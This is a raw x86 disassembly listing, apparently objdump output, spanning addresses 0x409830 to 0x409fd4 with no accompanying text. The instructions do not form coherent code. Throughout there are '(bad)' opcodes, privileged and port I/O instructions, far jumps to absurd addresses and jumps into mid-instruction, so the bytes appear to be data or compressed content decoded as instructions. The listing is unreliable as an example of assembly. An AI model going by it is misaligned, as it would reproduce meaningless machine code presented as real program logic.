  409830:	stos   DWORD PTR es:[edi],eax
  409831:	iret   
  409832:	adc    DWORD PTR [esi+0x49],eax
  409835:	xchg   esi,eax
  409836:	int    0x74
  409838:	xlat   BYTE PTR ds:[ebx]
  409839:	fwait
  40983a:	push   es
  40983b:	inc    esi
  40983c:	fwait
  40983d:	repz pusha 
  40983f:	sti    
  409840:	push   ds
  409841:	dec    ecx
  409842:	dec    ecx
  409843:	add    DWORD PTR [eax+0x4b],ebx
  409846:	and    ebp,DWORD PTR [eax+eax*2+0x7b701cd7]
  40984d:	ror    BYTE PTR [edx+0x25],cl
  409850:	in     eax,0xe1
  409852:	dec    esi
  409853:	mov    edi,eax
  409855:	imul   eax,DWORD PTR [ebp-0x3c0f3af4],0x2a
  40985c:	(bad)  
  40985d:	add    dh,BYTE PTR [ebx-0x3c10ff11]
  409863:	xchg   edi,eax
  409864:	jo     0x409872
  409866:	sti    
  409867:	push   cs
  409868:	cmp    cl,BYTE PTR [edi+0x6943cb38]
  40986e:	inc    edi
  40986f:	sbb    bl,BYTE PTR [edx+0x34]
  409872:	lock add ebx,DWORD PTR [ebp+0x2446a7f5]
  409879:	jmp    0x4098f8
  40987b:	fisttp QWORD PTR [edx-0x75]
  40987e:	inc    ebp
  40987f:	clc    
  409880:	push   0x2dd5473c
  409885:	pop    ecx
  409886:	inc    esi
  409887:	retf   
  409888:	mov    dh,0x23
  40988a:	xor    BYTE PTR [edx],dh
  40988c:	mov    edx,es
  40988e:	pop    ebx
  40988f:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  409891:	mov    ebx,0x7a17839
  409896:	sub    dh,ch
  409898:	mov    edx,DWORD PTR [ecx+0x15]
  40989b:	sbb    al,BYTE PTR [ebx-0x4b]
  40989e:	add    esi,eax
  4098a0:	and    edx,DWORD PTR [edx]
  4098a2:	fs scas al,BYTE PTR es:[edi]
  4098a4:	jo     0x409864
  4098a6:	inc    eax
  4098a7:	das    
  4098a8:	sbb    bh,dl
  4098aa:	(bad)  
  4098ab:	aam    0x12
  4098ad:	and    DWORD PTR [ecx+0x14],esi
  4098b0:	jmp    0x4098b6
  4098b2:	inc    ebx
  4098b3:	and    ebp,esi
  4098b5:	clc    
  4098b6:	icebp  
  4098b7:	nop
  4098b8:	iret   
  4098b9:	stos   BYTE PTR es:[edi],al
  4098ba:	ins    DWORD PTR es:[edi],dx
  4098bb:	clc    
  4098bc:	or     al,0xc6
  4098be:	xchg   esi,eax
  4098bf:	sub    BYTE PTR [ecx+0x1d],cl
  4098c2:	mov    esi,0xdfd4a143
  4098c7:	inc    ebx
  4098c8:	neg    ch
  4098ca:	clc    
  4098cb:	dec    eax
  4098cc:	dec    ebp
  4098cd:	out    dx,eax
  4098ce:	mov    eax,edx
  4098d0:	push   0xffffffd1
  4098d2:	mov    ecx,0x5cbfb4d
  4098d7:	(bad)  
  4098d8:	mov    eax,0x7b6f0c8b
  4098dd:	pop    es
  4098de:	test   al,ah
  4098e0:	mov    dh,0xb5
  4098e2:	enter  0xe050,0xee
  4098e6:	pop    ss
  4098e7:	je     0x4098a5
  4098e9:	call   0x510de1ee
  4098ee:	and    ah,BYTE PTR [esi+0x4f]
  4098f1:	popf   
  4098f2:	cs jg  0x4098b9
  4098f5:	pop    ebx
  4098f6:	cmp    BYTE PTR [ecx+esi*8+0x4c],al
  4098fa:	xor    DWORD PTR fs:[bx],0x32eb3357
  409902:	sub    BYTE PTR [edx],ah
  409904:	cmp    eax,0x303ab072
  409909:	jne    0x409936
  40990b:	xor    DWORD PTR [ecx],ebx
  40990d:	push   es
  40990e:	enter  0x8cfa,0xb4
  409912:	shr    BYTE PTR [ebx],1
  409914:	in     eax,dx
  409915:	inc    esi
  409916:	mov    esp,0xe1ffa0f6
  40991b:	mov    WORD PTR [ecx],cs
  40991d:	stos   DWORD PTR es:[edi],eax
  40991e:	aam    0x4b
  409920:	hlt    
  409921:	outs   dx,BYTE PTR ds:[esi]
  409922:	out    0xf1,eax
  409924:	stos   DWORD PTR es:[edi],eax
  409925:	into   
  409926:	and    bl,BYTE PTR [ebp+eiz*8-0x13]
  40992a:	push   ds
  40992b:	push   edx
  40992c:	sahf   
  40992d:	adc    ch,al
  40992f:	daa    
  409930:	test   al,0x1
  409932:	leave  
  409933:	mov    esi,0x6e4b3a9e
  409938:	cli    
  409939:	mov    ds:0xcfd420ff,eax
  40993e:	sbb    edx,DWORD PTR gs:[ebp-0x6d9b537f]
  409945:	mov    ecx,0x768892cb
  40994a:	in     al,dx
  40994b:	icebp  
  40994c:	int    0xb6
  40994e:	pop    ecx
  40994f:	rcl    DWORD PTR ds:0x6aa90838,0xe7
  409956:	ds out 0x8e,eax
  409959:	(bad)  
  40995a:	sub    BYTE PTR [esi-0x56bd01dd],bh
  409960:	xchg   edx,eax
  409961:	xor    al,0x49
  409963:	mov    esi,0xc79a0ddf
  409968:	cld    
  409969:	out    dx,al
  40996a:	push   ss
  40996b:	mov    edx,0x483b3056
  409970:	xor    eax,DWORD PTR [edx-0x37]
  409973:	jns    0x409962
  409975:	lock outs dx,BYTE PTR ds:[esi]
  409977:	aam    0x6e
  409979:	mov    ch,0xf6
  40997b:	mov    dh,0x36
  40997d:	jb     0x409962
  40997f:	pop    ss
  409980:	aam    0xf5
  409982:	xor    BYTE PTR [esp+ebp*1+0x4b2d762f],bl
  409989:	inc    edx
  40998a:	cld    
  40998b:	cmp    esi,DWORD PTR [ebx+0xf29eda4]
  409991:	mov    ebp,DWORD PTR [eax]
  409993:	cdq    
  409994:	jns    0x4099e0
  409996:	jge    0x4099bf
  409998:	and    al,ah
  40999a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40999b:	push   0x73
  40999d:	inc    esi
  40999e:	mov    esi,0x4948399c
  4099a3:	test   BYTE PTR [ecx],0x9b
  4099a6:	repz fwait
  4099a8:	hlt    
  4099a9:	(bad)  
  4099aa:	fisttp WORD PTR [ebx]
  4099ac:	popf   
  4099ad:	xchg   esp,eax
  4099ae:	inc    esi
  4099af:	inc    ecx
  4099b0:	dec    edi
  4099b1:	xor    dh,BYTE PTR [edx]
  4099b3:	cmp    eax,ebp
  4099b5:	xchg   BYTE PTR ds:0x6cca81df,al
  4099bb:	std    
  4099bc:	cld    
  4099bd:	mov    esp,0x60418a1
  4099c2:	fnsave [ebx]
  4099c4:	dec    esi
  4099c5:	aaa    
  4099c6:	inc    edi
  4099c7:	retf   0x53ea
  4099ca:	dec    ecx
  4099cb:	jae    0x409952
  4099cd:	popa   
  4099ce:	lods   al,BYTE PTR ds:[esi]
  4099cf:	scas   al,BYTE PTR es:[edi]
  4099d0:	pop    edx
  4099d1:	xchg   DWORD PTR [ecx-0x6c],ebp
  4099d4:	aas    
  4099d5:	or     edx,esi
  4099d7:	jno    0x409a13
  4099d9:	xor    al,0x73
  4099db:	mov    dl,0x2d
  4099dd:	out    0xa7,al
  4099df:	sub    BYTE PTR [ebp+0x3caffa93],dl
  4099e5:	aas    
  4099e6:	pop    ebx
  4099e7:	sub    bl,BYTE PTR [esi]
  4099e9:	dec    eax
  4099ea:	adc    al,0x86
  4099ec:	jmp    0x409a27
  4099ee:	mov    ebp,0x5a9d8884
  4099f3:	in     eax,0x62
  4099f5:	fsub   QWORD PTR [edi]
  4099f7:	adc    ah,BYTE PTR [ebx+0x59b2e276]
  4099fd:	mov    BYTE PTR [esi-0x54],bl
  409a00:	sbb    BYTE PTR [eax-0x76],dh
  409a03:	fidivr DWORD PTR [ebx+eax*1-0x677483fb]
  409a0a:	popf   
  409a0b:	mov    bh,0x98
  409a0d:	sar    BYTE PTR [ecx+ecx*8],0xdc
  409a11:	(bad)  [eax+0x64]
  409a14:	stc    
  409a15:	push   cs
  409a16:	fbstp  TBYTE PTR ds:0xcdd8797e
  409a1c:	and    eax,0xf192daf5
  409a21:	cmc    
  409a22:	scas   al,BYTE PTR es:[edi]
  409a23:	xchg   edi,eax
  409a24:	cli    
  409a25:	nop
  409a26:	inc    esi
  409a27:	dec    ebx
  409a28:	mov    ecx,0xc0517549
  409a2d:	sub    al,BYTE PTR [ebp+eiz*4+0x4b7c7d6d]
  409a34:	cmp    dl,ch
  409a36:	sbb    DWORD PTR ds:0x42f00081,edi
  409a3c:	jge    0x409a02
  409a3e:	pop    esp
  409a3f:	test   BYTE PTR [esi+0x4940ccac],dl
  409a45:	std    
  409a46:	pop    ebp
  409a47:	xchg   esp,eax
  409a48:	int    0x83
  409a4a:	fdiv   QWORD PTR [ebp-0x27]
  409a4d:	jns    0x409aaf
  409a4f:	mov    ch,0x13
  409a51:	inc    ecx
  409a52:	pop    edi
  409a53:	fs imul esi,ebp,0x3e835219
  409a5a:	idiv   BYTE PTR ds:0x610513a4
  409a60:	jle    0x409a86
  409a62:	in     al,dx
  409a63:	jge    0x409ac6
  409a65:	retf   0x2956
  409a68:	xchg   esi,eax
  409a69:	mov    edi,0xccada653
  409a6e:	mov    esi,0x998c24c3
  409a73:	(bad)  
  409a74:	cmp    eax,0x4a4ad997
  409a79:	dec    ecx
  409a7a:	retf   0x19ca
  409a7d:	push   esp
  409a7e:	jo     0x409a07
  409a80:	xor    al,0x2d
  409a82:	fistp  QWORD PTR [esi+eiz*1-0x58]
  409a86:	push   eax
  409a87:	shr    BYTE PTR ds:0xe6f74bc1,cl
  409a8d:	popa   
  409a8e:	js     0x409aba
  409a90:	push   esi
  409a91:	addr16 aad 0xbc
  409a94:	hlt    
  409a95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a96:	loopne 0x409ae6
  409a98:	mov    edi,0x28582135
  409a9d:	daa    
  409a9e:	cmp    al,0x26
  409aa0:	fsubr  DWORD PTR [eax]
  409aa2:	pop    eax
  409aa3:	push   cs
  409aa4:	mov    esi,ds
  409aa6:	mov    ecx,0x1f80c433
  409aab:	xor    BYTE PTR [esi-0x22],bl
  409aae:	(bad)  
  409aaf:	rol    BYTE PTR [edx-0x65715dc8],0x14
  409ab6:	stos   DWORD PTR es:[edi],eax
  409ab7:	push   ss
  409ab8:	les    ebp,FWORD PTR [edx]
  409aba:	scas   al,BYTE PTR es:[edi]
  409abb:	in     al,0x9a
  409abd:	xchg   ebx,eax
  409abe:	add    edx,0xffffff97
  409ac1:	test   BYTE PTR [edx],cl
  409ac3:	loope  0x409a79
  409ac5:	and    DWORD PTR [edx-0x4cb30a2d],edi
  409acb:	inc    ebp
  409acc:	cdq    
  409acd:	dec    eax
  409ace:	lea    eax,[ecx+edi*2-0x19]
  409ad2:	shr    BYTE PTR [ecx-0x5cc7314f],1
  409ad8:	dec    ecx
  409ad9:	arpl   WORD PTR [edi+0x47],dx
  409adc:	sbb    dh,BYTE PTR [esi+0x8]
  409adf:	jecxz  0x409aba
  409ae1:	pop    edx
  409ae2:	pop    ecx
  409ae3:	into   
  409ae4:	pop    edi
  409ae5:	repnz sbb edi,esp
  409ae8:	repz jbe 0x409a92
  409aeb:	mov    ecx,0xe7b8f562
  409af0:	adc    eax,0xb51768fe
  409af5:	sub    ah,BYTE PTR [esi]
  409af7:	inc    ebx
  409af8:	into   
  409af9:	inc    edx
  409afa:	dec    ebx
  409afb:	inc    esp
  409afc:	cmp    eax,0x80ebf644
  409b01:	fdivr  DWORD PTR [ecx-0xa]
  409b04:	mov    WORD PTR [edx-0x1025f349],?
  409b0a:	call   0xb2e2:0x9e7c017
  409b11:	(bad)  
  409b12:	mov    edx,0xb72a6324
  409b17:	pushw  ds
  409b19:	push   cs
  409b1a:	push   edi
  409b1b:	adc    ch,BYTE PTR [edi]
  409b1d:	mov    ebp,0xe2e4f518
  409b22:	ret    
  409b23:	and    ecx,DWORD PTR [eax+0x8]
  409b26:	mov    edi,0x8b431630
  409b2b:	inc    ecx
  409b2c:	sbb    BYTE PTR [ecx+ecx*2],dl
  409b2f:	mov    ch,0x95
  409b31:	jae    0x409b51
  409b33:	xlat   BYTE PTR ds:[ebx]
  409b34:	dec    ebp
  409b35:	xchg   esp,eax
  409b36:	(bad)  
  409b37:	xchg   ebx,eax
  409b38:	not    eax
  409b3a:	addr16 cmp cl,bh
  409b3d:	mov    ebp,0x14fa07ff
  409b42:	dec    ebx
  409b43:	xor    esp,DWORD PTR [eax+0x6281694c]
  409b49:	and    DWORD PTR [edi],ebx
  409b4b:	pop    esi
  409b4c:	inc    ebp
  409b4d:	fisub  WORD PTR [ebx-0x32e6a643]
  409b53:	dec    esp
  409b54:	or     esp,ebx
  409b56:	and    BYTE PTR [edx-0x5b839f1a],0x93
  409b5d:	push   esi
  409b5e:	outs   dx,BYTE PTR ds:[esi]
  409b5f:	add    eax,esp
  409b61:	stos   BYTE PTR es:[edi],al
  409b62:	fcomp  DWORD PTR [ebx-0x3a]
  409b65:	cli    
  409b66:	mov    esp,DWORD PTR [edi+0x59]
  409b69:	jle    0x409bdd
  409b6b:	pop    eax
  409b6c:	lods   eax,DWORD PTR ds:[esi]
  409b6d:	not    DWORD PTR [eax]
  409b6f:	mov    bh,0x82
  409b71:	jl     0x409b5b
  409b73:	ror    ebp,1
  409b75:	jns    0x409b99
  409b77:	dec    esi
  409b78:	pop    es
  409b79:	jg     0x409b15
  409b7b:	pop    ebx
  409b7c:	(bad)  
  409b7d:	cmovns edi,DWORD PTR [eax+0x78175d3b]
  409b84:	xchg   esi,eax
  409b85:	mov    edx,0x3dc74178
  409b8a:	loopne 0x409bb1
  409b8c:	bound  ebp,QWORD PTR [edx+0x1288182e]
  409b92:	clc    
  409b93:	pop    edx
  409b94:	and    DWORD PTR [esi-0x68],edi
  409b97:	or     BYTE PTR [ebx],ah
  409b99:	bound  ebp,QWORD PTR ds:[edi+0x3b2c8e7d]
  409ba0:	sub    bl,BYTE PTR [esi+0xec832f9]
  409ba6:	jp     0x409b51
  409ba8:	push   ebp
  409ba9:	sbb    edi,edi
  409bab:	adc    al,0x92
  409bad:	repnz (bad) 
  409baf:	mov    esi,0x2c133902
  409bb4:	and    BYTE PTR [ebx],bl
  409bb6:	and    BYTE PTR [edx+0x3],0x63
  409bba:	jnp    0x409c2c
  409bbc:	mov    al,0x4d
  409bbe:	out    0x2b,eax
  409bc0:	xchg   esi,edx
  409bc2:	data16 fcomi st,st(7)
  409bc5:	xor    DWORD PTR [ebx],ebp
  409bc7:	imul   DWORD PTR [eax]
  409bc9:	pop    ds
  409bca:	mov    DWORD PTR [ecx-0x32ac9f03],esi
  409bd0:	sub    eax,eax
  409bd2:	gs lahf 
  409bd4:	in     al,0x91
  409bd6:	add    DWORD PTR [edi+0x6a4258d2],ebx
  409bdc:	(bad)  
  409bdd:	cli    
  409bde:	xor    BYTE PTR [eax],0xc1
  409be1:	fld    TBYTE PTR [edx]
  409be3:	add    eax,0x81021431
  409be8:	mov    edx,0x5971e313
  409bed:	iret   
  409bee:	pushf  
  409bef:	sub    eax,0xa5161be2
  409bf4:	inc    ebp
  409bf5:	mov    ebx,0xac29f1bd
  409bfa:	add    al,0x2c
  409bfc:	test   eax,0x9a2e8faf
  409c01:	push   es
  409c02:	jg     0x409b86
  409c04:	js     0x409bcf
  409c06:	sahf   
  409c07:	sbb    edi,DWORD PTR [edi+0xe038932]
  409c0d:	jmp    0x51680283
  409c12:	lods   al,BYTE PTR ds:[esi]
  409c13:	mov    eax,ds:0x32b7ffcb
  409c18:	or     eax,0xae8f05c8
  409c1d:	outs   dx,DWORD PTR ds:[esi]
  409c1e:	call   0x2ebd42e0
  409c23:	data16 loop 0x409bbd
  409c26:	dec    ebx
  409c27:	add    eax,0xaacbef38
  409c2c:	ds mov esi,0x91876f74
  409c32:	jmp    0xeb06dfb0
  409c37:	sbb    ah,BYTE PTR [edx]
  409c39:	scas   al,BYTE PTR es:[edi]
  409c3a:	lock or esp,DWORD PTR [esi+0x7a76c343]
  409c41:	aaa    
  409c42:	loope  0x409c1e
  409c44:	cmp    eax,ecx
  409c46:	rcr    cl,1
  409c48:	cmp    al,0x2
  409c4a:	mov    al,ds:0x7673551d
  409c4f:	or     DWORD PTR [ebx+0x582c75f4],esp
  409c55:	inc    ecx
  409c56:	fistp  QWORD PTR [ebp+0x5cc696fd]
  409c5c:	lahf   
  409c5d:	sahf   
  409c5e:	mov    ebp,0xbf316e02
  409c63:	fstp   QWORD PTR [edi+edi*8]
  409c66:	pop    esp
  409c67:	mov    DWORD PTR [ebx-0x7406e620],esi
  409c6d:	mov    eax,0x6a149eb1
  409c72:	lods   al,BYTE PTR ds:[esi]
  409c73:	cli    
  409c74:	(bad)  
  409c76:	fs push es
  409c78:	in     al,0xfc
  409c7a:	rcr    cl,cl
  409c7c:	xchg   BYTE PTR [edx-0x68],bh
  409c7f:	ret    0x66e
  409c82:	rol    DWORD PTR [esi+esi*1],0x1b
  409c86:	mov    cl,0x32
  409c88:	sbb    DWORD PTR [bx+di+0x2bb1],0x25ccb668
  409c91:	hlt    
  409c92:	dec    edx
  409c93:	das    
  409c94:	call   0x6499058a
  409c99:	mov    DWORD PTR [ecx],0xcd690fc5
  409c9f:	cs nop
  409ca1:	sbb    eax,0xd226e224
  409ca6:	jne    0x409ca9
  409ca8:	or     eax,0x1cde724a
  409cad:	outs   dx,DWORD PTR ds:[esi]
  409cae:	mov    bh,BYTE PTR [edx+eiz*1+0x2121c417]
  409cb5:	stc    
  409cb6:	mov    DWORD PTR [edx+edi*8],esi
  409cb9:	jns    0x409c8e
  409cbb:	mov    ebx,esi
  409cbd:	dec    esi
  409cbe:	sbb    eax,0x173931d8
  409cc3:	mov    ah,0x8a
  409cc5:	and    ah,BYTE PTR [ebp+0xe]
  409cc8:	jg     0x409ca6
  409cca:	lds    ebx,FWORD PTR [edx]
  409ccc:	lock mov DWORD PTR [edx],ebp
  409ccf:	clc    
  409cd0:	loop   0x409c57
  409cd2:	popa   
  409cd3:	cmp    esp,DWORD PTR fs:0x5c51a34d
  409cda:	stos   BYTE PTR es:[edi],al
  409cdb:	shl    BYTE PTR [esi],cl
  409cdd:	mov    cl,0xe2
  409cdf:	shl    DWORD PTR [ebp-0x977224c],cl
  409ce5:	mov    esp,0x4c752bbd
  409cea:	scas   eax,DWORD PTR es:[edi]
  409ceb:	ret    0x714c
  409cee:	out    0xef,al
  409cf0:	push   ecx
  409cf1:	div    dl
  409cf3:	push   es
  409cf4:	inc    edi
  409cf5:	cld    
  409cf6:	std    
  409cf7:	fild   WORD PTR [edi-0x524fe886]
  409cfd:	fild   DWORD PTR [eax+0x4b9135f0]
  409d03:	pushf  
  409d04:	ss push ebx
  409d06:	nop
  409d07:	loopne 0x409cbb
  409d09:	adc    BYTE PTR [ecx+0x9],al
  409d0c:	shl    BYTE PTR [ebp-0x76],0x71
  409d10:	iret   
  409d11:	into   
  409d12:	clc    
  409d13:	int3   
  409d14:	xchg   esp,eax
  409d15:	je     0x409d81
  409d17:	in     al,0xc8
  409d19:	ins    DWORD PTR es:[edi],dx
  409d1a:	lea    ebp,[ebx]
  409d1c:	sub    edi,DWORD PTR [esi-0xb]
  409d1f:	mov    esi,0x42b9f1e5
  409d24:	and    edx,DWORD PTR [eax-0x72084f3b]
  409d2a:	xchg   ebx,ebx
  409d2c:	cmp    ebp,DWORD PTR [edi]
  409d2e:	xor    dh,BYTE PTR [ebx]
  409d30:	xor    dl,bl
  409d32:	stos   DWORD PTR es:[edi],eax
  409d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d34:	in     eax,dx
  409d35:	shr    DWORD PTR [edx*4-0x4d6db9da],1
  409d3c:	int    0x46
  409d3e:	cmp    eax,0x9865f324
  409d43:	mov    ds:0x25485925,al
  409d48:	out    dx,eax
  409d49:	mov    al,ds:0x52b73682
  409d4e:	inc    esp
  409d4f:	push   edi
  409d50:	sub    DWORD PTR [edi],ecx
  409d52:	mov    al,ds:0x6a06b108
  409d57:	and    esp,DWORD PTR [edx-0x58d38a85]
  409d5d:	popf   
  409d5e:	sbb    BYTE PTR [edx+0x1d],dl
  409d61:	loope  0x409db3
  409d63:	pusha  
  409d64:	adc    eax,0x934e6a9c
  409d69:	mov    cs,WORD PTR [edi+0x57ef4401]
  409d6f:	push   ecx
  409d70:	stos   BYTE PTR es:[edi],al
  409d71:	jb     0x409d25
  409d73:	sbb    ebx,DWORD PTR [edx]
  409d75:	and    edi,ebp
  409d77:	mov    bh,0x71
  409d79:	adc    al,0xd2
  409d7b:	rcl    BYTE PTR [bx+di],1
  409d7e:	sub    al,dl
  409d80:	jns    0x409d3a
  409d82:	arpl   si,ax
  409d84:	frstor [edx]
  409d86:	rcr    BYTE PTR [esi+0x19a6e6cd],cl
  409d8c:	jecxz  0x409d74
  409d8e:	clc    
  409d8f:	cwde   
  409d90:	enter  0x8447,0xa
  409d94:	(bad)  
  409d96:	xchg   BYTE PTR [eax+0x6e5d6d98],al
  409d9c:	sub    BYTE PTR [ecx+esi*2-0x1a],dl
  409da0:	repnz dec esp
  409da2:	cmp    DWORD PTR [eax+0x5d],ebx
  409da5:	in     al,dx
  409da6:	pop    esp
  409da7:	imul   ebp,DWORD PTR [eax-0x2e],0x44682cae
  409dae:	jg     0x409db0
  409db0:	(bad)  
  409db1:	shl    DWORD PTR [esi],1
  409db3:	fwait
  409db4:	test   al,0xc
  409db6:	xlat   BYTE PTR ds:[ebx]
  409db7:	jbe    0x409e1d
  409db9:	out    dx,al
  409dba:	mov    ds:0xfb7be293,eax
  409dbf:	pop    esi
  409dc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dc1:	lahf   
  409dc2:	loop   0x409db5
  409dc4:	daa    
  409dc5:	or     bl,al
  409dc7:	sub    dh,ah
  409dc9:	or     al,0x85
  409dcb:	shl    BYTE PTR [ebx+edi*4-0x6e],1
  409dcf:	jle    0x409d75
  409dd1:	es stos BYTE PTR es:[edi],al
  409dd3:	sbb    ch,ch
  409dd5:	hlt    
  409dd6:	xor    DWORD PTR [eax+0x1c13a246],esp
  409ddc:	jg     0x409db0
  409dde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ddf:	clc    
  409de0:	mov    al,0x3b
  409de2:	ret    0xc3f5
  409de5:	cs enter 0x62d0,0x49
  409dea:	mov    dl,BYTE PTR [ebp+0x37ba30e1]
  409df0:	cmp    BYTE PTR [edx],ch
  409df2:	stos   DWORD PTR es:[edi],eax
  409df3:	inc    eax
  409df4:	sub    eax,0xb7ffa781
  409df9:	dec    DWORD PTR [eax+0x78]
  409dfc:	scas   eax,DWORD PTR es:[edi]
  409dfd:	ret    
  409dfe:	sub    al,0x5c
  409e00:	icebp  
  409e01:	test   BYTE PTR [eax+0x678eb48a],ah
  409e07:	push   esp
  409e08:	jne    0x409e77
  409e0a:	mov    eax,ds:0xd59354f5
  409e0f:	jge    0x409df8
  409e11:	sti    
  409e12:	ret    0x2374
  409e15:	add    eax,0x8a8716cb
  409e1a:	mov    DWORD PTR [ebp+0x2e],0xdbda4f8b
  409e21:	sbb    BYTE PTR [edx+0x8],dh
  409e24:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  409e26:	or     eax,0xa8428f7b
  409e2b:	repnz pop ebp
  409e2d:	nop
  409e2e:	jns    0x409e06
  409e30:	and    al,0xf5
  409e32:	pop    DWORD PTR ds:0xab442cdc
  409e38:	ins    DWORD PTR es:[edi],dx
  409e39:	jge    0x409e0c
  409e3b:	fsubrp st(3),st
  409e3d:	jmp    0x95d4:0x8a16a5f2
  409e44:	repnz out 0x45,eax
  409e47:	mov    eax,0xc524fe38
  409e4c:	mov    ecx,0x9ca883b7
  409e51:	inc    eax
  409e52:	es push esi
  409e54:	add    esi,DWORD PTR [eax+0x409ad383]
  409e5a:	mov    bh,0x3f
  409e5c:	out    dx,eax
  409e5d:	test   BYTE PTR [esi-0x59],0x28
  409e61:	mov    bl,0xa3
  409e63:	outs   dx,DWORD PTR ds:[esi]
  409e64:	loopne 0x409e27
  409e66:	imul   ecx,DWORD PTR [ecx],0xce6f96a6
  409e6c:	addr16 neg ch
  409e6f:	mov    DWORD PTR [ecx-0xc3b0528],eax
  409e75:	shl    ebp,0xaf
  409e78:	stos   DWORD PTR es:[edi],eax
  409e79:	inc    ebx
  409e7a:	jae    0x409e40
  409e7c:	stos   BYTE PTR es:[edi],al
  409e7d:	or     al,0xe8
  409e7f:	mov    DWORD PTR [esi-0x14],0x93bce69e
  409e86:	(bad)  
  409e87:	cmp    al,0x4e
  409e89:	dec    esp
  409e8a:	push   ecx
  409e8b:	mov    edi,0x7f5a76aa
  409e90:	mov    cl,0xbf
  409e92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e93:	adc    ebx,DWORD PTR [esi]
  409e95:	daa    
  409e96:	pop    ecx
  409e97:	in     eax,0xaf
  409e99:	cdq    
  409e9a:	mov    ds:0x142d022a,al
  409e9f:	popaw  
  409ea1:	mov    ebx,0x1789f71f
  409ea6:	xchg   ecx,eax
  409ea7:	add    al,0x80
  409ea9:	add    edi,eax
  409eab:	xor    ch,BYTE PTR [ecx]
  409ead:	test   al,0x9f
  409eaf:	jbe    0x409ec2
  409eb1:	adc    al,0xba
  409eb3:	and    DWORD PTR [esi],eax
  409eb5:	sbb    eax,0x1be0025c
  409eba:	(bad)  
  409ebc:	jge    0x409f34
  409ebe:	xor    ebx,DWORD PTR [eax-0xd]
  409ec1:	mov    ds:0xa22e8ec7,eax
  409ec6:	xor    eax,0xc4648762
  409ecb:	loope  0x409f1e
  409ecd:	sub    al,0x3e
  409ecf:	aas    
  409ed0:	add    ebx,DWORD PTR [edi+0x64]
  409ed3:	inc    ebx
  409ed4:	dec    esi
  409ed5:	and    edi,DWORD PTR [esi]
  409ed7:	(bad)  
  409ed8:	jne    0x409f57
  409eda:	test   BYTE PTR [edx-0x7aa0424e],cl
  409ee0:	dec    esp
  409ee1:	xchg   BYTE PTR [ebx],dl
  409ee3:	fiadd  WORD PTR [bx+di+0x2f]
  409ee7:	test   al,0x48
  409ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409eea:	retf   
  409eeb:	sub    al,0x6a
  409eed:	mov    dh,0xaf
  409eef:	fld    QWORD PTR [ebx]
  409ef1:	leave  
  409ef2:	out    dx,eax
  409ef3:	lods   al,BYTE PTR ds:[esi]
  409ef4:	leave  
  409ef5:	sbb    DWORD PTR ds:0x815e9710,ebx
  409efb:	xchg   edi,eax
  409efc:	cmp    al,cl
  409efe:	in     al,0xa3
  409f00:	add    DWORD PTR ds:0xffd0292b,edx
  409f06:	fs dec eax
  409f08:	enter  0x35bd,0xe1
  409f0c:	inc    edx
  409f0d:	mov    edi,0xcd9fe6f9
  409f12:	das    
  409f13:	jb     0x409f6d
  409f15:	push   ds
  409f16:	xor    DWORD PTR ds:0x13e4f4a4,ebx
  409f1c:	lods   al,BYTE PTR ds:[esi]
  409f1d:	dec    ebp
  409f1e:	adc    BYTE PTR [edi+0x1f],al
  409f21:	outs   dx,DWORD PTR ds:[esi]
  409f22:	retf   0xb7b1
  409f25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f26:	data16 cld 
  409f28:	push   ss
  409f29:	jmp    0xc2ac5e97
  409f2e:	adc    eax,esp
  409f30:	dec    esp
  409f31:	or     BYTE PTR [ecx-0x29],bh
  409f34:	loop   0x409f25
  409f36:	adc    BYTE PTR [edi],dl
  409f38:	push   ebx
  409f39:	int    0xf4
  409f3b:	fs mov dh,0x4d
  409f3e:	cli    
  409f3f:	cmp    dl,bh
  409f41:	sub    al,0x9
  409f43:	inc    edi
  409f44:	js     0x409fc5
  409f46:	xor    cl,BYTE PTR [edx-0x68]
  409f49:	jns    0x409f3f
  409f4b:	push   esp
  409f4c:	xchg   ecx,eax
  409f4d:	mov    ah,BYTE PTR [esi-0x49c481d0]
  409f53:	adc    ch,BYTE PTR [eax+0x3e38360c]
  409f59:	inc    esi
  409f5a:	inc    ecx
  409f5b:	fild   DWORD PTR [edx+0x30e4307a]
  409f61:	add    eax,0xcc9599c1
  409f66:	std    
  409f67:	lea    eax,[edx-0x5d]
  409f6a:	enter  0xadb1,0xd1
  409f6e:	inc    ecx
  409f6f:	inc    ebp
  409f70:	dec    ebp
  409f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f72:	lahf   
  409f73:	inc    esp
  409f74:	inc    ecx
  409f75:	(bad)  
  409f76:	jmp    0xd811:0xcc30
  409f7c:	jg     0x409f1a
  409f7e:	xlat   BYTE PTR ds:[ebx]
  409f7f:	pop    ss
  409f80:	sbb    ebp,esi
  409f82:	xchg   esp,eax
  409f83:	xor    al,0xf4
  409f85:	in     al,0x35
  409f87:	dec    ecx
  409f88:	je     0x409fd9
  409f8a:	push   ecx
  409f8b:	push   es
  409f8c:	push   es
  409f8d:	es or  eax,0xef4c844b
  409f93:	jae    0x409ff0
  409f95:	mov    ch,0xdb
  409f97:	cli    
  409f98:	es in  al,0x37
  409f9b:	cld    
  409f9c:	hlt    
  409f9d:	stos   BYTE PTR es:[edi],al
  409f9e:	fisub  WORD PTR [ecx+0x503e8b89]
  409fa4:	lods   al,BYTE PTR ds:[esi]
  409fa5:	xchg   ebx,eax
  409fa6:	cdq    
  409fa7:	retf   
  409fa8:	pop    edx
  409fa9:	les    edx,FWORD PTR [edx+0x63c9f324]
  409faf:	cmp    DWORD PTR [eax+0x32e8838e],0x4084cb36
  409fb9:	leave  
  409fba:	xchg   edx,eax
  409fbb:	in     eax,dx
  409fbc:	in     eax,0x97
  409fbe:	jnp    0x40a026
  409fc0:	test   al,0x23
  409fc2:	cmp    eax,0xf
  409fc5:	jno    0x409f92
  409fc7:	sbb    DWORD PTR [edx+0x22],0xab3520e
  409fce:	add    al,BYTE PTR [ebx-0x70]
  409fd1:	cli    
  409fd2:	jno    0x409fa9
  409fd4:	xchg   esp,eax
